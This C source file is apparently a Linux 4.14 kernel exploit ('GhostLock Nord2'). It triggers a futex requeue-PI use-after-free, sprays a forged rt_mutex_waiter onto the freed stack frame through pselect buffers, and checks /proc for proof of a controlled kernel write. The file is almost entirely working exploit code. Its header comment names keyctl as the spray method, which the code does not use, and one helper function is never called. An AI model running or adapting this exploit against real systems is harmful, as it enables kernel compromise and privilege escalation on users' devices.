/*
 * GhostLock Nord2 - Correct stack reclaim using keyctl
 *
 * The freed rt_mutex_waiter contains garbage pointers → kernel panic.
 * We must spray a VALID fake waiter onto the freed frame BEFORE triggering.
 *
 * keyctl(KEYCTL_UPDATE) copies user data to kernel stack large enough to
 * cover the freed waiter frame. We fill it with a valid fake waiter where:
 *   - task = init_task (valid task_struct)
 *   - lock = address with valid owner/waiters
 *   - prio = sentinel value
 *   - all rb_node pointers = init_task (safe to dereference)
 *
 * After the reclaim, FUTEX_LOCK_PI walks through the now-controlled waiter
 * and calls rt_mutex_setprio(init_task, sentinel_prio).
 * If this works, init_task's prio in /proc changes → we have controlled write.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/futex.h>
#include <time.h>
#include <errno.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif

/* rt_mutex_waiter offsets for 4.14 */
#define WAITER_PRIO_OFF   0x18
#define WAITER_TASK_OFF   0x50
#define WAITER_LOCK_OFF   0x58

#define SENTINEL_PRIO 77  /* expect /proc to show -78 if controlled */

static uint32_t f_wait=0, f_pi_target=0, f_pi_chain=0;
static atomic_int g_tid=0, g_ready=0, g_waiting=0;
static atomic_int g_owner_started=0, g_owner_done=0;
static atomic_int g_do_reclaim=0, g_reclaim_done=0;

/* kernel addresses (set at runtime from kallsyms) */
static uint64_t g_init_task=0;
static uint64_t g_noop_llseek=0;

static uint64_t read_sym(const char *name) {
    FILE *f=fopen("/proc/kallsyms","r"); if(!f) return 0;
    uint64_t a=0; char t[8],s[256];
    while (fscanf(f,"%llx %s %255s",(unsigned long long*)&a,t,s)==3)
        if (!strcmp(s,name)){fclose(f);return a;}
    fclose(f); return 0;
}

static int get_prio(pid_t tid) {
    char p[64]; snprintf(p,sizeof(p),"/proc/%d/stat",(int)tid);
    FILE *f=fopen(p,"r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

void *owner_fn(void *_) {
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    struct sched_param sp={.sched_priority=50}; sched_setscheduler(0,SCHED_FIFO,&sp);
    syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while (!atomic_load(&g_ready)) usleep(500);
    atomic_store(&g_owner_started,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_owner_done,1);
    for(;;) sleep(1);
    return NULL;
}

/*
 * Build fake waiter at buf+offset.
 * All pointer fields set to init_task (valid, won't crash).
 * prio set to SENTINEL_PRIO for detection.
 */
static void build_fake_waiter(uint8_t *buf, size_t buf_sz,
                               uint64_t init_task, int sentinel_prio) {
    /* fill with init_task pattern - safe to dereference anywhere */
    for (size_t i=0; i+7<buf_sz; i+=8)
        memcpy(buf+i, &init_task, 8);

    /* Try placing fake waiter at every possible 8-byte alignment */
    /* We don't know the exact offset, so fill the whole buffer */
    for (size_t off=0; off+0x70<=buf_sz; off+=8) {
        /* waiter->prio at +0x18 */
        *(int32_t*)(buf+off+WAITER_PRIO_OFF) = sentinel_prio;
        /* waiter->task at +0x50 = init_task */
        memcpy(buf+off+WAITER_TASK_OFF, &init_task, 8);
        /* waiter->lock at +0x58 - needs owner field
         * init_task has pi_lock at offset 0x9ec, owner at pi_mutex is complex
         * For now use init_task itself - kernel will read lock->owner
         * which at init_task+0 is a valid address */
        memcpy(buf+off+WAITER_LOCK_OFF, &init_task, 8);
    }
}

static void pw(unsigned long *bi, unsigned long *bo, unsigned long *be,
               int wps, int gw, unsigned long v) {
    if(gw<0||gw>=wps*3) return;
    int si=gw/wps, wi=gw%wps;
    if(si==0) bi[wi]=v;
    else if(si==1) bo[wi]=v;
    else if(si==2) be[wi]=v;
}

void *waiter_fn(void *_) {
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    atomic_store(&g_tid,(int)syscall(SYS_gettid));
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_ready,1);
    while (!atomic_load(&g_owner_started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=60;
    atomic_store(&g_waiting,1);
    /* UAF trigger */
    syscall(SYS_futex,&f_wait,FUTEX_WAIT_REQUEUE_PI,0,&ts,&f_pi_target,0);

    /* Stack freed. Wait for signal. */
    while (!atomic_load(&g_do_reclaim)) usleep(100);

    /*
     * Spray fake waiter onto the freed stack frame via pselect.
     * Use NFDS=320, words_per_set=5.
     * We scan all shifts so one of them must land at the right offset.
     */
    int dn=open("/dev/null",O_RDONLY);
    int hfd=fcntl(dn,F_DUPFD,319); close(dn);

    for (int shift=-40; shift<=40; shift++) {
        fd_set in,out,ex; FD_ZERO(&in); FD_ZERO(&out); FD_ZERO(&ex);
        unsigned long *bi=(unsigned long*)&in;
        unsigned long *bo=(unsigned long*)&out;
        unsigned long *be=(unsigned long*)&ex;
        int wps=5;

        /* Place fake waiter at this shift:
         * prio (word 3+shift), task (word 10+shift), lock (word 11+shift) */
        /* Fill all words with init_task pattern */
        for(int w=0;w<wps*3;w++) pw(bi,bo,be,wps,w,g_init_task);
        /* Set prio sentinel at word 3+shift (WAITER_PRIO_OFF/8=3) */
        pw(bi,bo,be,wps,3+shift, (unsigned long)SENTINEL_PRIO);
        /* Set task at word 10+shift (WAITER_TASK_OFF/8=10) */
        pw(bi,bo,be,wps,10+shift, g_init_task);
        /* Set lock at word 11+shift (WAITER_LOCK_OFF/8=11) */
        pw(bi,bo,be,wps,11+shift, g_init_task);

        struct timespec tv={0,1};
        pselect(hfd+1,&in,&out,&ex,&tv,NULL);
    }
    close(hfd);

    atomic_store(&g_reclaim_done,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
    while (!atomic_load(&g_owner_done)) usleep(500);
    return NULL;
}

int main(void) {
    setvbuf(stderr,NULL,_IONBF,0);
    fprintf(stderr,"=== GhostLock Nord2 - Reclaim Finder v2 ===\n");

    /* Get kernel addresses */
    g_init_task = read_sym("_stext");
    if (!g_init_task) { fprintf(stderr,"[!] kallsyms fail\n"); return 1; }
    g_init_task += 0x1c6d300; /* from our analysis */
    fprintf(stderr,"[*] init_task = %llx\n", (unsigned long long)g_init_task);
    fprintf(stderr,"[*] Sentinel prio = %d (look for /proc prio = -%d)\n\n",
            SENTINEL_PRIO, SENTINEL_PRIO+1);

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(2,&cs); sched_setaffinity(0,sizeof(cs),&cs);

    for (int att=0; att<20; att++) {
        f_wait=0; f_pi_target=0; f_pi_chain=0;
        atomic_store(&g_tid,0); atomic_store(&g_ready,0);
        atomic_store(&g_waiting,0); atomic_store(&g_owner_started,0);
        atomic_store(&g_owner_done,0);
        atomic_store(&g_do_reclaim,0); atomic_store(&g_reclaim_done,0);

        pthread_t ot,wt;
        pthread_create(&ot,NULL,owner_fn,NULL);
        pthread_create(&wt,NULL,waiter_fn,NULL);

        while (!atomic_load(&g_waiting)||!atomic_load(&g_owner_started)) usleep(500);
        usleep(5000);

        syscall(SYS_futex,&f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1UL,&f_pi_target,0);
        usleep(1000);
        atomic_store(&g_do_reclaim,1);
        while (!atomic_load(&g_reclaim_done)) usleep(500);
        usleep(2000);

        /* Now try FUTEX_LOCK_PI to trigger UAF with hopefully valid fake waiter */
        struct timespec ft={0,10000000};
        long r=syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,&ft,NULL,0);
        if(r==0) syscall(SYS_futex,&f_pi_target,FUTEX_UNLOCK_PI,0,NULL,NULL,0);

        usleep(5000);
        pid_t tid=(pid_t)atomic_load(&g_tid);
        int p=get_prio(tid);
        int rt = (p < 0 && p != -999) ? -(p+1) : 0;
        fprintf(stderr,"[att=%d] prio=%d RT=%d %s\n", att, p, rt,
                rt==SENTINEL_PRIO ? "<-- CONTROLLED!" :
                (rt>0 ? "(UAF fired, random)" : ""));

        if (rt==SENTINEL_PRIO) {
            fprintf(stderr,"\n[!!!] CONTROLLED WRITE ACHIEVED!\n");
            fprintf(stderr,"[!!!] waiter->task=init_task, prio=%d\n",SENTINEL_PRIO);
            break;
        }

        pthread_detach(ot); pthread_detach(wt);
        usleep(20000);
    }
    return 0;
}
__attribute__((constructor)) static void _init(void) { main(); }
